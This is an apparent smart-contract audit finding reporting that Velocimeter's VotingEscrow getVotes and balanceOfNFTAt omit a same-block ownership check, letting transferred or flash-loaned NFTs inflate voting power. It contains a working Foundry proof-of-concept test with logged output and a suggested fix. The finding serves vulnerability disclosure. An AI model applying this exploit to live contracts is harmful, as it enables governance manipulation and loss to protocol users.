Macho Pine Lemur

High

# Malicious Users Could Flash-loan the Vote Escrow NFTs to Inflate the Voting Balance of Their Accounts

## Summary

Voting balance of an account can be inflated using flash-loans.

## Vulnerability Detail

The `balanceOfNFT()` inside the VotingEscrow contract first checks if any ownership change of a NFT ID is in the current block or not, and returns zero if it is changed. 
This check is necessary to have newly transferred NFTs with zero voting balances to prevent someone from flash-loaning and inflating their voting balance.

```Solidity
    function balanceOfNFT(uint _tokenId) external view returns (uint) {
        if (ownership_change[_tokenId] == block.number) return 0;
        return _balanceOfNFT(_tokenId, block.timestamp);
    }
```
https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/VotingEscrow.sol#L1031-L1034

However, this check is not there in `balanceOfNFTAt()` and `balanceOfAtNFT()` functions:

```Solidity
    function balanceOfNFTAt(uint _tokenId, uint _t) external view returns (uint) {
        return _balanceOfNFT(_tokenId, _t);
    }
```

As a result, Velocimetery or some external protocols that try to use `balanceOfNFTAt()` and `_balanceOfNFT()` external functions to find voting balance will return different voting balances for the same NFT ID depending on which function they called.

```Solidity
    function getVotes(address account) external view returns (uint) {
        uint32 nCheckpoints = numCheckpoints[account];
        if (nCheckpoints == 0) {
            return 0;
        }
        uint[] storage _tokenIds = checkpoints[account][nCheckpoints - 1].tokenIds;
        uint votes = 0;
        for (uint i = 0; i < _tokenIds.length; i++) {
            uint tId = _tokenIds[i];
            votes = votes + _balanceOfNFT(tId, block.timestamp);
        }
        return votes;
    }
```

## Proof of Concept

Consider adding this test to `VotingEscrow.t.sol`:

```Solidity
    function testVoteInflationByTransferToken() public {
        address user1 = address(0x101);
        address user2 = address(0x102);

        deal(address(flowDaiPair), user1, 100 ether);
        deal(address(flowDaiPair), user2, 1000000 ether);
        deal(address(FLOW), user1, 100 ether);
        deal(address(FLOW), user2, 100 ether);
        

        vm.startPrank(user1);
        flowDaiPair.approve(address(escrow), type(uint256).max);
        uint256 tokenId = escrow.create_lock(TOKEN_1, MAXTIME);
        assertEq(escrow.ownerOf(tokenId), user1);
        console.log("balanceOfToken(tokenId)   :", escrow.balanceOfNFT(tokenId));
        console.log("getVotes(user1)           :", escrow.getVotes(user1));
        console.log("getVotes(user2)           :", escrow.getVotes(user2));

        // assertEq(escrow.balanceOfNFT(tokenId), getMaxVotingPower(TOKEN_1, escrow.locked__end(tokenId)));
        assertEq(escrow.balanceOfNFT(tokenId), escrow.balanceOfNFTAt(tokenId, block.timestamp));
        assertEq(escrow.balanceOfNFT(tokenId), escrow.getVotes(user1));
        assertEq(escrow.getVotes(user2), 0);

        vm.stopPrank();

        // Take a flashloan of veALCX
        vm.startPrank(user2);
        flowDaiPair.approve(address(escrow), type(uint256).max);
        console.log("\nTake a flashloan of veALCX token");
        uint256 tokenId2 = escrow.create_lock(TOKEN_1M, MAXTIME);
        console.log("Created VeALCX with 1M locked tokens");
        console.log("getVotes(user2)           :", escrow.getVotes(user2));
        // assertEq(escrow.balanceOfNFT(tokenId2), getMaxVotingPower(TOKEN_1M, escrow.locked__end(tokenId2)));

        // Transferring tokenId2 from user2 to user1
        console.log("\nTransferring flashloaned tokenId2 from user2 to user1");
        escrow.safeTransferFrom(user2, user1, tokenId2);
        assertEq(escrow.ownerOf(tokenId2), user1);
        vm.stopPrank();

        console.log("balanceOfToken(tokenId)   :", escrow.balanceOfNFT(tokenId));
        console.log("balanceOfToken(tokenId2)  :", escrow.balanceOfNFT(tokenId2));
        console.log("balanceOfTokenAt(tokenId2):", escrow.balanceOfNFTAt(tokenId2, block.timestamp));
        console.log("getVotes(user1)           : %s <= Inflated voting power", escrow.getVotes(user1));
        console.log("getVotes(user2)           :", escrow.getVotes(user2));

        assertEq(escrow.balanceOfNFT(tokenId2), 0);
        assertNotEq(escrow.getVotes(user1), escrow.balanceOfNFT(tokenId) + escrow.balanceOfNFT(tokenId2)); // Protects the ownership change
        assertEq(escrow.getVotes(user1), escrow.balanceOfNFT(tokenId) + escrow.balanceOfNFTAt(tokenId2, block.timestamp)); // Not protecting

        vm.stopPrank();
    }
```

Output of the test:

```Markdown
Ran 1 test for test/VotingEscrow.t.sol:VotingEscrowTest
[PASS] testVoteInflationByTransferToken() (gas: 1489856)
Logs:
  balanceOfToken(tokenId)   : 999999968174574804
  getVotes(user1)           : 999999968174574804
  getVotes(user2)           : 0

Take a flashloan of veALCX token
  Created VeALCX with 1M locked tokens
  getVotes(user2)           : 999999968203093174574804

Transferring flashloaned tokenId2 from user2 to user1
  balanceOfToken(tokenId)   : 999999968174574804
  balanceOfToken(tokenId2)  : 0
  balanceOfTokenAt(tokenId2): 999999968203093174574804
  getVotes(user1)           : 1000000968203061349149608 <= Inflated voting power
  getVotes(user2)           : 0

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 5.85ms (2.13ms CPU time)
```

## Impact

Users can inflate their voting power:

1. Which they can use to vote for a malicious governance proposal
2. Also, the same attack can be used to alter the `tokenURI`.

## Code Snippet

https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/VotingEscrow.sol#L1292-L1304
https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/VotingEscrow.sol#L1017-L1029

## Tool used

Manual Review

## Recommendation

Consider implementing a flashloan protection check inside the `_balanceOfNFT()` function in the VotingEscrow contract